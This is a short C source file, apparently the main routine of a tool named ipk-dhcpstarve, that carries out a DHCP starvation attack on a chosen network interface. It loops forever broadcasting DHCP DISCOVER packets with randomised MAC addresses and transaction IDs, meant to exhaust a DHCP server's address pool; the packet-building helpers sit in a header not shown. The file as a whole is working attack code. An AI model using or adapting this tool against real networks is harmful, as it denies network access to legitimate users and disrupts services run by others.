#include "ipk-dhcpstarve_api.h"

int main(int argc, char *argv[])
{
    /* Parse command line arguments */
    if (!parse_cmd(argc, argv)) {
        printf("./ipk-dhcpstarve -i interface\n");
        return 1;
    }

    /* Create DHCP socket */
    int sock = create_DHCP_socket();

    if (sock < 0) {
        perror("Failed to create socket");
        return 1;
    }

    /* Init DHCP DISCOVERY message */
    dhcp_set_discovery_message();

    /* spam DISCOVERY packet */
    while (1) {
            /* change MAC address in DICOVERY message packet */
            dhcp_message_set_random_MAC();
            /* change transaction ID */
            dhcp_message_set_random_transaction_id();
            /* send DISCOVERY message */
            int status = dhcp_message_broadcast(sock);
            if (status < 0)
                fprintf(stderr, "Failed to send dhcp message\n");
    }

    return 0;
}
